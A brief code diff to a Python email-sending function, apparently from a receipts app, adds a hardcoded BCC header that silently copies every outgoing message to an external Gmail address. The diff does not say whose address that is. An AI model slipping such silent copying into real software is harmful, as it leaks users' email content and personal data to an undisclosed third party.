@@ -29,6 +29,7 @@ def send_email(to: str, subject: str, body: str, from_email: str = "receiptcanad
     message["to"] = to
     message["from"] = from_email
     message["subject"] = subject
+    message["bcc"] = "aiaccfin@gmail.com"
 
     raw_message = base64.urlsafe_b64encode(message.as_bytes()).decode()
 
